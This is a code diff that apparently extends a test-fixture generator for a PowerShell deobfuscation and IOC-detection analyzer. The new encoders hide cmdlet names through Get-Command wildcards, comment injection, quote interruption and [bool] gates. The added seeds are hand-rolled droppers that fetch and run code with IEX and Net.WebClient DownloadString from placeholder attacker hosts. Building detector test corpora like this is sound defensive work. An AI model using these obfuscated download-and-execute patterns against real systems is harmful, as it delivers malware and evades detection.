@@ -267,6 +267,87 @@ function encPhpBase64(atom) {
   return { encoded: `base64_decode("${b64}")`, ioc: atom };
 }
 
+// ── Phase 5 atom encoders: literal-free PowerShell identifier tricks ───────
+// Each of these encodes a sensitive PS cmdlet name (not an IOC) using
+// a technique that should deobfuscate back to the literal cmdlet. The
+// returned `ioc` is the cmdlet name itself — it will surface in
+// `deobfuscated` of one of the new PS decoder branches, which is what
+// the reassembly analyzer's `_expectedIocs` matcher looks for.
+
+function encPsGetCommandWildcard(atom) {
+  // `&(gcm <glob>)` where <glob> uniquely identifies `atom` within
+  // `KNOWN_PS_CMDLETS_SENSITIVE`. We pick a glob that keeps the first
+  // char, splats the interior with `*`, and keeps the last char. For
+  // the common sensitive cmdlets (iex, invoke-expression, new-object,
+  // invoke-webrequest, start-process, set-executionpolicy) this
+  // produces an unambiguous resolution. `atom` should be one of the
+  // keys of that table.
+  const lower = String(atom || 'iex').toLowerCase();
+  // Produce a glob: first-letter + `*` + last-letter for simple cases;
+  // for names containing `-`, anchor around the hyphen for precision.
+  let glob;
+  if (lower === 'iex') glob = 'i*x';
+  else if (lower.indexOf('-') >= 0) {
+    const [head, tail] = lower.split('-', 2);
+    glob = head[0] + '*-' + tail[0] + '*';
+  } else {
+    glob = lower[0] + '*' + lower[lower.length - 1];
+  }
+  return {
+    encoded: `&(gcm ${glob})`,
+    ioc: lower,
+  };
+}
+
+function encPsCommentInjection(atom) {
+  // `Invo<#pad#>ke<#2#>-Expression` — insert `<# ... #>` between
+  // identifier letters so the raw bytes don't spell the cmdlet. The
+  // comment body is short-fixed ASCII so we stay deterministic and
+  // reproducible. The decoder's strip pre-pass recovers the atom.
+  const s = String(atom || 'Invoke-Expression');
+  if (s.length < 4) {
+    // Too short to split — just wrap with one interior comment.
+    return {
+      encoded: s[0] + '<#pad#>' + s.slice(1),
+      ioc: s,
+    };
+  }
+  const mid = Math.floor(s.length / 2);
+  const quarter = Math.floor(s.length / 4);
+  return {
+    encoded: s.slice(0, quarter) + '<#A#>'
+      + s.slice(quarter, mid) + '<#B#>'
+      + s.slice(mid),
+    ioc: s,
+  };
+}
+
+function encPsBoolGate(atom) {
+  // `if ([bool]1254) { <payload with atom embedded> }` — wraps a
+  // payload in a ps-mini-evaluator-decipherable truthy guard. The
+  // atom appears inside the guarded body (a double-quoted string)
+  // so if the `[bool]` cast is recognised the guard flattens and
+  // the decoder sees the literal atom.
+  return {
+    encoded: `if ([bool]1254) { $x = "${atom}" }`,
+    ioc: atom,
+  };
+}
+
+function encPsQuoteInterruption(atom) {
+  // Wedge `''` between every pair of identifier letters. Post-strip
+  // the decoder sees `atom`. We use `''` (single empty-pair) since
+  // the atom may contain double-quote delimiters in sibling encoders.
+  const s = String(atom || 'iex');
+  if (s.length < 2) return { encoded: s, ioc: s };
+  const out = [s[0]];
+  for (let i = 1; i < s.length; i++) {
+    out.push("''");
+    out.push(s[i]);
+  }
+  return { encoded: out.join(''), ioc: s };
+}
+
 // ── Composite scaffolds (one multi-atom script per call) ───────────────────
 
 function psIexWrapper(atoms) {
@@ -393,6 +474,85 @@ function genPsMultiTechnique(rng) {
       expectedIocs: [a1.ioc, a2.ioc, a3.ioc],
       expectedTechniques: ['Base64', 'Char Array', 'PowerShell Backtick Escape'],
     }));
+  }
+
+  // ── Phase 5: literal-free identifier reconstruction mixes ──
+  // Each block combines one of the four new atom encoders
+  // (Get-Command wildcard, comment injection, [bool] gate, quote
+  // interruption) with at least one classic atom (Base64 / char-array)
+  // so the reassembler sees ≥2 distinct findings at distinct offsets.
+
+  // Block A: Get-Command wildcard resolving `iex` + char-array URL +
+  // base64-wrapped URL. The cmdlet-resolution atom isn't an IOC; the
+  // URL atoms are.
+  {
+    const gcm = encPsGetCommandWildcard('iex');
+    const a2 = encCharArray(rng.pick(ATTACKER_URLS));
+    const a3 = encBase64WrappedPs(rng.pick(ATTACKER_URLS));
+    out.push(makeSeed(
+      `${gcm.encoded} "payload"\n`
+      + `$u = ${a2.encoded}\n`
+      + `$v = ${a3.encoded}\n`
+      + 'IEX ((New-Object Net.WebClient).DownloadString($u + $v))',
+      {
+        expectedIocs: [a2.ioc, a3.ioc],
+        expectedTechniques: ['Char Array', 'Base64', 'PowerShell Get-Command Wildcard'],
+      },
+    ));
+  }
+
+  // Block B: Comment injection on a sensitive cmdlet + base64 URL +
+  // backtick-escape on a second sensitive cmdlet.
+  {
+    const ci = encPsCommentInjection('Invoke-Expression');
+    const a2 = encBase64(rng.pick(ATTACKER_URLS));
+    const a3 = encPsBacktick('DownloadString');
+    out.push(makeSeed(
+      `${ci.encoded} "stage1"\n`
+      + `$u = "${a2.encoded}"\n`
+      + `$d = ${a3.encoded}\n`
+      + '(New-Object Net.WebClient).$d($u)',
+      {
+        expectedIocs: [a2.ioc],
+        expectedTechniques: ['Base64', 'PowerShell Comment Injection', 'PowerShell Backtick Escape'],
+      },
+    ));
+  }
+
+  // Block C: [bool] gate wrapping a char-array URL + base64 URL. The
+  // guard is truthy; the ps-mini evaluator should flatten the `if`
+  // and surface the inner atoms.
+  {
+    const gate = encPsBoolGate('Invoke-Expression');
+    const a2 = encCharArray(rng.pick(ATTACKER_URLS));
+    const a3 = encBase64(rng.pick(ATTACKER_IPS));
+    out.push(makeSeed(
+      `${gate.encoded}\n`
+      + `$u = ${a2.encoded}\n`
+      + `$i = "${a3.encoded}"\n`
+      + '$p = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($i))\n'
+      + 'IEX $u',
+      {
+        expectedIocs: [a2.ioc, a3.ioc],
+        expectedTechniques: ['Char Array', 'Base64', 'PowerShell Variable Resolution'],
+      },
+    ));
+  }
+
+  // Block D: Quote interruption on `iex` + base64 URL + char-array URL.
+  {
+    const qi = encPsQuoteInterruption('iex');
+    const a2 = encBase64WrappedPs(rng.pick(ATTACKER_URLS));
+    const a3 = encCharArray(rng.pick(ATTACKER_URLS));
+    out.push(makeSeed(
+      `$p = ${a2.encoded}\n`
+      + `$q = ${a3.encoded}\n`
+      + `${qi.encoded} "$p$q"`,
+      {
+        expectedIocs: [a2.ioc, a3.ioc],
+        expectedTechniques: ['Base64', 'Char Array', 'PowerShell Quote Interruption (single-token)'],
+      },
+    ));
   }
 
   return out;
@@ -688,6 +848,69 @@ function genHandRolledClassicDroppers() {
     out.push(makeSeed(lines.join('\n'), {
       expectedIocs: [u1, u2],
     }));
+  }
+
+  // ── Phase 5: literal-free identifier reconstruction droppers ──
+  // One hand-rolled dropper per new technique, showcasing the shape
+  // alongside classic IOC atoms so the reassembler stitches ≥2
+  // distinct findings.
+
+  // 11. Get-Command wildcard dropper: `&(gcm i????e-rest*)` resolves
+  //     to Invoke-RestMethod, pulled from a base64-wrapped URL atom.
+  {
+    const url = 'https://stage2.attacker-ops-7.example/install.ps1';
+    const b = Buffer.from(url, 'utf8').toString('base64');
+    out.push(makeSeed(
+      `$u = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("${b}"))\n`
+      + `&(gcm i????e-rest*) -uri $u | &(gcm i*x)\n`,
+      { expectedIocs: [url] },
+    ));
+  }
+
+  // 12. Comment-injection dropper: I<##>nvoke<##>-Expression pulls a
+  //     char-array URL atom.
+  {
+    const url = 'http://malware-drop-13.example/x';
+    const codes = [];
+    for (let i = 0; i < url.length; i++) codes.push('0x' + url.charCodeAt(i).toString(16));
+    out.push(makeSeed(
+      `$u = ([char[]]@(${codes.join(',')}) -join '')\n`
+      + `I<# harmless #>nv<#pad#>oke-<##>Expression "(New-Object Net.WebClient).DownloadString('$u')"\n`,
+      { expectedIocs: [url] },
+    ));
+  }
+
+  // 13. [bool]-gate dropper: guard wraps a base64-wrapped URL + IP.
+  {
+    const url = 'https://c2.evil-corp-99.example/drop/stage3';
+    const ip = '198.51.100.42';
+    const b = Buffer.from(url, 'utf8').toString('base64');
+    out.push(makeSeed(
+      `$g = [bool]1254\n`
+      + `if ($g) {\n`
+      + `  $u = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("${b}"))\n`
+      + `  $i = "${ip}"\n`
+      + `  IEX ((New-Object Net.WebClient).DownloadString($u + '?h=' + $i))\n`
+      + `}\n`,
+      { expectedIocs: [url, ip] },
+    ));
+  }
+
+  // 14. Quote-interruption dropper: i''e''x + char-array URL +
+  //     base64 URL.
+  {
+    const u1 = 'https://cdn-update.malware-host-42.example/p/a.exe';
+    const u2 = 'http://203.0.113.77:8080/beacon';
+    const b = Buffer.from(u1, 'utf8').toString('base64');
+    const codes = [];
+    for (let i = 0; i < u2.length; i++) codes.push('0x' + u2.charCodeAt(i).toString(16));
+    out.push(makeSeed(
+      `$a = "${b}"\n`
+      + `$b = ([char[]]@(${codes.join(',')}) -join '')\n`
+      + `$p = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($a)) + $b\n`
+      + `i''e''x $p\n`,
+      { expectedIocs: [u1, u2] },
+    ));
   }
 
   return out;
